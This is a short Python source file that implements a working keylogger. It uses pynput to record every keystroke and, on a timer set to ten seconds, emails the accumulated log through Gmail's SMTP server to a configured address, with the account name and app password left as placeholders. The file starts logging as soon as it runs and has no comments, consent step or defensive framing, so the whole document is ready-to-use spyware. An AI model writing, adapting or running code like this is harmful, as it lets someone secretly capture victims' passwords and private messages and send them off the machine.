
import threading
import pynput.keyboard
import smtplib
import logging

log = ""
class Keylogger :

    def __init__(self , set_interval , mail, passwd) :
        self.log =""
        self.set_interval = set_interval
        self.mail = mail
        self.passwd = passwd

    def append_to_log(self,string) :
        self.log = self.log + string

    def pressOnKey (self ,key) :
        try :
            current =  str(key.char)
        except AttributeError :
            if key == key.space :
                current= " "
            else :
                current =" " + str(key) + " "
        self.append_to_log(current)

    def report (self) :
        self.sendMail(self.mail,self.passwd,"\n\n"+self.log)
        self.log = ""
        timer = threading.Timer(self.set_interval,self.report)
        timer.start()

    def sendMail (self ,mail,passwd,msg) :
        try :
            server = smtplib.SMTP("smtp.gmail.com",587)
            server.starttls()
            server.login(mail,passwd)
            server.sendmail(mail,mail,msg)
            server.quit()
        except Exception as e:
            logging.error(f"Failed to send email: {str(e)}")

    def start (self) :
        keyboard = pynput.keyboard.Listener(on_press=self.pressOnKey)
        with keyboard :
            self.report()
            keyboard.join()

my_keylogger = Keylogger(10,"your email address","app password for gmail account")
my_keylogger.start()

